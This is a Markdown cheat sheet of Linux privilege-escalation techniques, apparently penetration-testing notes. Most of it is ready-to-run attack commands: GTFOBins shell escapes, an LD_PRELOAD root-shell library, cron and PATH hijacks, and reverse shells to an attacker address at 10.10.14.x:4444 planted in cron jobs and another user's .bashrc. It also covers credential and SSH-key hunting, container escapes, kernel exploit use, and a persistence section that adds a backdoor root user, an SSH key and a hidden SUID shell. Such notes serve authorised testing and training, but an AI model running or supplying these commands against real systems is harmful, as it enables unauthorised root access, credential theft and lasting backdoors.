# Linux Privilege Escalation

#Privesc #Linux #PrivilegeEscalation

## What is this?

Elevating from a low-privilege shell to root via misconfigurations, weak permissions, vulnerable services, SUID/SGID abuse, sudo misconfigs, capabilities, cron jobs, or kernel exploits. Goal: root shell or access to root-readable data.

Common staging dir: `/tmp` or `/dev/shm` (in-memory, no disk writes)

---

## Tools

| Tool | Use |
|------|-----|
| [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) | Automated enumeration — finds most common vectors, color-coded output |
| [LinEnum](https://github.com/rebootuser/LinEnum) | Legacy but solid — broad automated enumeration |
| [linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) | Kernel version → CVE suggestions |
| [pspy](https://github.com/DominicBreuker/pspy) | Monitor processes without root — catch cron jobs, scripts run by root |
| [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) | Python script, good for older systems |
| [GTFOBins](https://gtfobins.github.io/) | Reference for abusing sudo/SUID/capabilities on common binaries |

### Deliver tools to target

```bash
# Python HTTP server on attacker
python3 -m http.server 8080

# On target
wget http://10.10.14.x:8080/linpeas.sh -O /tmp/linpeas.sh
curl http://10.10.14.x:8080/linpeas.sh -o /tmp/linpeas.sh

chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/out.txt
```

---

## Initial Enumeration

### System Info

```bash
uname -a                        # Kernel version + arch
cat /etc/os-release             # Distro + version
cat /proc/version               # Kernel + compiler
hostname
lscpu                           # CPU info
```

### Users & Groups

```bash
id                              # Current user, groups, uid/gid
whoami
cat /etc/passwd                 # All users (look for non-system users with shells)
cat /etc/group                  # Groups + members
cat /etc/sudoers                # If readable — sudo config
sudo -l                         # What can current user run as sudo
last                            # Login history
w                               # Who is logged in
```

### Network

```bash
ip a                            # Interfaces + IPs
ip route                        # Routing table
ss -tulpn                       # Listening ports + processes
netstat -tulpn                  # Alternative
arp -a                          # ARP cache — adjacent hosts
cat /etc/hosts
```

### Processes & Services

```bash
ps aux                          # All processes
ps aux | grep root              # Root-owned processes
top -bn1                        # Snapshot of processes
systemctl list-units --type=service --state=running
```

### Installed Software

```bash
dpkg -l                         # Debian/Ubuntu
rpm -qa                         # RHEL/CentOS
apt list --installed 2>/dev/null
which python python3 perl ruby gcc wget curl nc ncat socat 2>/dev/null
```

### File Systems & Mounts

```bash
df -h
mount                           # Mounted filesystems
cat /etc/fstab                  # Check for NFS mounts, credentials in options
lsblk
```

### Environment

```bash
env
echo $PATH
cat ~/.bash_history
cat ~/.bashrc
cat ~/.bash_profile
```

---

## Sudo Exploitation

### Check sudo rights

```bash
sudo -l
```

**Output patterns and what they mean:**

```
(ALL : ALL) ALL               → full sudo — su to root with: sudo su
(ALL) NOPASSWD: /usr/bin/vim  → run vim as root, no password
(root) /usr/bin/python3       → run python3 as root
```

### sudo ALL → root

```bash
sudo su
sudo bash
sudo -i
```

### NOPASSWD binary — check GTFOBins

Most common:

```bash
# vim
sudo vim -c ':!/bin/bash'

# nano — write /etc/passwd or /etc/sudoers
sudo nano /etc/sudoers
# Add: <username> ALL=(ALL) NOPASSWD: ALL

# less / more
sudo less /etc/passwd
# Inside: !/bin/bash

# find
sudo find . -exec /bin/bash \; -quit

# python / python3
sudo python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# perl
sudo perl -e 'exec "/bin/bash";'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# nmap (older versions with --interactive)
sudo nmap --interactive
# Inside: !bash

# wget — overwrite /etc/sudoers or /etc/passwd
sudo wget http://10.10.14.x/sudoers -O /etc/sudoers

# tee — write to root-only files
echo "ALL ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers

# tar — exec via checkpoint
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# zip
sudo zip /tmp/exploit.zip /tmp/exploit -T --unzip-command="sh -c /bin/bash"

# bash (if version allows -p to preserve SUID)
sudo bash -p
```

### sudo with specific environment — LD_PRELOAD

If `env_keep += LD_PRELOAD` is in sudoers:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
```

### sudo shell escape — restricted command with arguments

If sudo allows `(root) /usr/bin/vim /var/log/app.log`, try:
```bash
sudo vim /var/log/app.log -c ':!/bin/bash'
```

---

## SUID / SGID Binaries

### Find SUID/SGID

```bash
find / -perm -u=s -type f 2>/dev/null          # SUID
find / -perm -g=s -type f 2>/dev/null          # SGID
find / -perm /6000 -type f 2>/dev/null         # Both

# Compare against known-good list — anything unusual is worth checking
find / -perm -u=s -type f 2>/dev/null | xargs ls -la
```

### Common SUID exploits via GTFOBins

```bash
# bash (if SUID)
bash -p             # -p preserves EUID — opens root shell if SUID root

# cp — overwrite /etc/passwd or /etc/sudoers
cp /etc/passwd /tmp/passwd.bak
# edit /tmp/passwd.bak to add root user
cp /tmp/passwd.bak /etc/passwd

# find
find . -exec /bin/bash -p \; -quit

# vim / vi
vim -c ':py import os; os.execl("/bin/bash", "bash", "-p")'

# nmap
nmap --interactive   # !bash

# more / less
# Run as SUID, then: !bash

# python
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# env
env -i PATH=/tmp /bin/bash -p

# tee (SUID) — write to root-only files
echo "<root_user_entry>" | tee -a /etc/passwd
```

### Custom SUID binary with path injection

If a custom SUID binary calls a command without full path (e.g. `system("service apache2 start")`):

```bash
# Check for relative path calls (strings on the binary)
strings /path/to/suid_binary | grep -v "/"

# Inject via PATH
cd /tmp
echo '#!/bin/bash' > service
echo '/bin/bash -p' >> service
chmod +x service
export PATH=/tmp:$PATH
/path/to/suid_binary       # runs /tmp/service as root
```

---

## Linux Capabilities

Capabilities grant partial root-level abilities to binaries without full SUID. `cap_setuid+ep` is the key one — allows the binary to change its UID to 0.

### Find capabilities

```bash
getcap -r / 2>/dev/null
```

**Dangerous capabilities:**

| Capability | Risk |
|-----------|------|
| `cap_setuid+ep` | Set UID to 0 → root |
| `cap_setgid+ep` | Set GID to 0 |
| `cap_net_raw+ep` | Sniff traffic, raw sockets |
| `cap_sys_admin+ep` | Near-root — mount, namespace, etc. |
| `cap_dac_override+ep` | Bypass file permission checks |
| `cap_chown+ep` | Change ownership of any file |

### Exploiting cap_setuid

```bash
# Python with cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'

# perl with cap_setuid+ep
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# ruby with cap_setuid+ep
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# nodejs with cap_setuid+ep
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'

# vim with cap_setuid+ep
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'

# gdb with cap_setuid+ep
gdb -q --nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit
```

---

## Cron Jobs

Root cron jobs run scripts as root. If you can write to the script (or a script it calls), you get code execution as root.

### Enumerate cron

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l                          # Current user's crons
cat /var/spool/cron/crontabs/root   # Root's crontab (if readable)

# Watch for processes running as root (catch jobs not in crontab)
./pspy64
```

### Writable script called by root cron

```bash
# Check permissions on the script
ls -la /path/to/script.sh

# If writable, append a reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' >> /path/to/script.sh

# Or replace entirely
cat > /path/to/script.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
EOF
```

### Writable directory in cron PATH

If `PATH` in `/etc/crontab` includes a world-writable directory before the legitimate binary location:

```bash
# Check PATH order in /etc/crontab
# If /tmp or /home/user is in PATH before /usr/bin:
cat > /tmp/targetscript << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /tmp/targetscript
# Wait for cron to run → /tmp/rootbash -p gives root shell
```

### Wildcard injection in cron

If a root cron runs: `tar czf /backup/archive.tar.gz /home/user/*`

The wildcard `*` expands in the shell — filenames are treated as arguments:

```bash
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh shell.sh'
cat > shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x shell.sh
# Wait for cron → /tmp/rootbash -p
```

Works with: `tar`, `rsync`, `chown`, `chmod`

---

## Writable Files & Paths

### /etc/passwd

If writable, add a root-equivalent user (no shadow password needed — put hash directly in passwd):

```bash
# Generate a password hash
openssl passwd -1 -salt hax p4ssword
# or
python3 -c "import crypt; print(crypt.crypt('p4ssword', '\$1\$hax\$'))"

# Append new root user
echo 'haxroot:$1$hax$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd

# Or set empty password (if passwd allows it)
echo 'haxroot::0:0:root:/root:/bin/bash' >> /etc/passwd

su haxroot
```

### /etc/shadow

If readable, copy hashes for cracking:

```bash
cat /etc/shadow
# Copy root hash:
hashcat -m 1800 '$6$...' /usr/share/wordlists/rockyou.txt   # sha512crypt
hashcat -m 500  '$1$...' /usr/share/wordlists/rockyou.txt   # md5crypt
```

### /etc/sudoers

If writable:

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo bash
```

### Writable script called by root (general)

```bash
# Find files owned by root that are world-writable
find / -user root -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v "^/dev"

# Or group-writable files where you're in the group
find / -group $(id -g) -writable -not -path "/proc/*" 2>/dev/null
```

---

## NFS (No Root Squash)

By default NFS squashes the root user — root on the client maps to `nobody` on the server. If `no_root_squash` is set, root on the client IS root on the NFS share.

### Check for no_root_squash

```bash
# On target (if you can read /etc/exports)
cat /etc/exports
# Look for: /share *(rw,no_root_squash)

# From attacker — check showmount
showmount -e <target_ip>
```

### Exploit no_root_squash

On attacker (as root):

```bash
# Mount the export
mkdir /mnt/target_nfs
mount -t nfs <target_ip>:/share /mnt/target_nfs

# Create SUID bash
cp /bin/bash /mnt/target_nfs/rootbash
chmod +s /mnt/target_nfs/rootbash

# On target — execute
/share/rootbash -p          # root shell
```

---

## PATH Hijacking

A script or binary runs a command without full path (e.g. `service`, `python`, `gcc`) — inject your own version via PATH.

```bash
# Find writable directories in PATH
echo $PATH
ls -la /usr/local/bin /usr/local/sbin

# Create malicious binary
mkdir /tmp/hijack
cat > /tmp/hijack/service << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/hijack/service

# Prepend to PATH
export PATH=/tmp/hijack:$PATH

# Run the vulnerable binary
/path/to/vulnerable_suid_binary
```

---

## Shared Library Hijacking

### LD_PRELOAD (if set in environment and allowed)

```c
// preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
LD_PRELOAD=/tmp/preload.so <suid_or_sudo_binary>
```

### LD_LIBRARY_PATH (if binary uses relative library path)

```bash
# Find library calls
ldd /path/to/binary
# If any library is in a writable directory, create a malicious version

# Or if binary loads from current directory
readelf -d /path/to/binary | grep -i rpath
```

### Writable /etc/ld.so.conf.d/

```bash
ls -la /etc/ld.so.conf.d/
# If writable, add a path where you control a library:
echo "/tmp/libs" >> /etc/ld.so.conf.d/evil.conf
ldconfig
# Place malicious .so in /tmp/libs/ with same name as a library the SUID binary uses
```

---

## Docker / LXC Escape

### Check if in a container

```bash
cat /proc/1/cgroup | grep docker
ls /.dockerenv                  # Exists inside Docker containers
env | grep -i kube
```

### Docker group

Being in the `docker` group is equivalent to root:

```bash
id | grep docker
groups | grep docker

# Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or start a privileged container
docker run --rm -it --privileged --net=host alpine sh
# Inside: mount /dev/sda1 /mnt → access host FS
```

### LXC / LXD group

```bash
id | grep lxd

# On attacker — build a minimal Alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && sudo bash build-alpine
# Transfer alpine.tar.gz to target

# On target
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# Inside: cd /mnt/root → full host FS access as root
```

### Privileged container breakout

If already inside a privileged container:

```bash
fdisk -l                        # List host disks
mkdir /mnt/host
mount /dev/sda1 /mnt/host       # Mount host FS
chroot /mnt/host                # Root on host
```

---

## Credential Hunting

### History files

```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history
find / -name ".*_history" -readable 2>/dev/null
```

### Config files

```bash
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.config" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null

# Common locations
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /etc/mysql/mysql.conf.d/mysqld.cnf
find /var/www -name "*.php" | xargs grep -i "password\|passwd\|db_pass" 2>/dev/null
```

### SSH keys

```bash
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat ~/.ssh/id_rsa
ls -la ~/.ssh/
```

### Password in scripts / env

```bash
grep -rn "password\|passwd\|secret\|api_key\|token" /home /var/www /opt /etc 2>/dev/null
grep -rn "PASS\|PASSWORD" /etc/environment /etc/profile.d/ 2>/dev/null
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
```

### Writable .bashrc / .bash_profile

```bash
# Check if writable for another user's home
ls -la /home/otheruser/.bashrc
# If so, add reverse shell — fires when that user logs in
echo 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' >> /home/otheruser/.bashrc
```

---

## Kernel Exploits

Last resort — can crash the system, use carefully.

### Check kernel version

```bash
uname -r
uname -a
cat /etc/os-release
```

### Get suggestions

```bash
# linux-exploit-suggester
wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# searchsploit on Kali
searchsploit linux kernel <version>
searchsploit linux privilege escalation
```

### Notable kernel exploits

| CVE | Name | Kernel versions |
|-----|------|----------------|
| CVE-2016-5195 | Dirty COW | 2.6.22 – 4.8.3 |
| CVE-2022-0847 | Dirty Pipe | 5.8 – 5.16.11 |
| CVE-2021-4034 | PwnKit (pkexec) | All with Polkit |
| CVE-2021-3156 | Baron Samedit (sudo) | sudo < 1.9.5p2 |
| CVE-2019-14287 | sudo -1 bypass | sudo < 1.8.28 |
| CVE-2019-18634 | sudo pwfeedback | sudo < 1.8.31 |

```bash
# PwnKit (any Linux with Polkit installed, regardless of kernel)
# Most reliable modern local privesc
git clone https://github.com/ly4k/PwnKit
cd PwnKit && make
./PwnKit

# Dirty Pipe (Linux 5.8 – 5.16.11)
# Overwrites SUID binary with shellcode → root shell
# PoC at: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

# Baron Samedit (sudo < 1.9.5p2)
# Heap overflow in sudo — NOPASSWD not needed
# PoC: https://github.com/blasty/CVE-2021-3156

# sudo -1 bypass (sudo < 1.8.28)
# If (ALL, !root) in sudoers:
sudo -u#-1 /bin/bash
```

---

## Logrotate Exploitation

If logrotate runs as root and logs are in a writable location:

```bash
# Check logrotate config
cat /etc/logrotate.conf
ls /etc/logrotate.d/
# If a log file you can write to is rotated, use logrotten:
# https://github.com/whotwagner/logrotten
```

---

## Weak File Permissions Summary

```bash
# World-writable files NOT in /proc, /sys, /dev
find / -perm -o+w -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null

# World-writable directories
find / -perm -o+w -type d -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null

# Files owned by current user but run by root (scripts in cron, services)
find / -user $(whoami) -type f 2>/dev/null | grep -v "^/proc\|^/sys\|^/home/$(whoami)"

# Unowned files (orphaned — may indicate removed user)
find / -nouser -o -nogroup 2>/dev/null | grep -v "^/proc\|^/sys"
```

---

## Post-Exploitation — Persistence

```bash
# Add root user to /etc/passwd
echo 'haxroot:$1$hax$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd

# Add SSH key to /root/.ssh/authorized_keys
mkdir -p /root/.ssh
echo '<your_public_key>' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# SUID bash backdoor
cp /bin/bash /tmp/.rootbash
chmod +s /tmp/.rootbash
/tmp/.rootbash -p

# Root cron reverse shell
echo '* * * * * root bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' >> /etc/crontab
```

---

## Quick Reference Checklist

```
ENUMERATION
[ ] id, whoami, sudo -l
[ ] uname -a, cat /etc/os-release
[ ] cat /etc/passwd — unusual users with shells
[ ] cat /etc/crontab, ls /etc/cron.d/ — root cron jobs
[ ] ps aux | grep root — root-owned processes
[ ] ss -tulpn — local-only listening services
[ ] Run LinPEAS: /tmp/linpeas.sh | tee /tmp/out.txt

SUDO
[ ] sudo -l — what can you run?
[ ] Check GTFOBins for any allowed binary
[ ] Look for env_keep LD_PRELOAD in sudoers
[ ] sudo -u#-1 if (ALL, !root) policy (CVE-2019-14287)
[ ] sudo version: sudo --version (Baron Samedit if < 1.9.5p2)

SUID / SGID
[ ] find / -perm -u=s -type f 2>/dev/null
[ ] Check GTFOBins for each unusual SUID binary
[ ] strings on custom SUID binaries — look for unqualified commands

CAPABILITIES
[ ] getcap -r / 2>/dev/null
[ ] cap_setuid+ep on any binary → instant root

CRON JOBS
[ ] Check /etc/crontab and /etc/cron.d/
[ ] Run pspy64 — catch cron jobs not visible in crontab
[ ] Check if scripts called by cron are writable
[ ] Check cron PATH for writable dirs before /usr/bin
[ ] Check for wildcard usage in cron commands (tar, rsync)

WRITABLE SENSITIVE FILES
[ ] ls -la /etc/passwd /etc/shadow /etc/sudoers
[ ] find / -user root -writable -not -path "/proc/*" 2>/dev/null

NFS
[ ] cat /etc/exports — look for no_root_squash
[ ] showmount -e <target> from attacker

CREDENTIALS
[ ] cat ~/.bash_history, ~/.zsh_history
[ ] grep -r "password" /var/www /home /opt /etc 2>/dev/null
[ ] find / -name "id_rsa" 2>/dev/null
[ ] Check /proc/*/environ for leaked env vars

CONTAINERS
[ ] ls /.dockerenv — in Docker?
[ ] id | grep docker — docker group → instant root
[ ] id | grep lxd — LXD group → host FS access

KERNEL
[ ] ./linux-exploit-suggester.sh
[ ] Check for PwnKit (pkexec) — works on all distros with Polkit
[ ] Dirty Pipe if kernel 5.8–5.16.11
[ ] Run Metasploit: use post/multi/recon/local_exploit_suggester
```

> See also: [[Windows Priv Esc]] for Windows-specific techniques
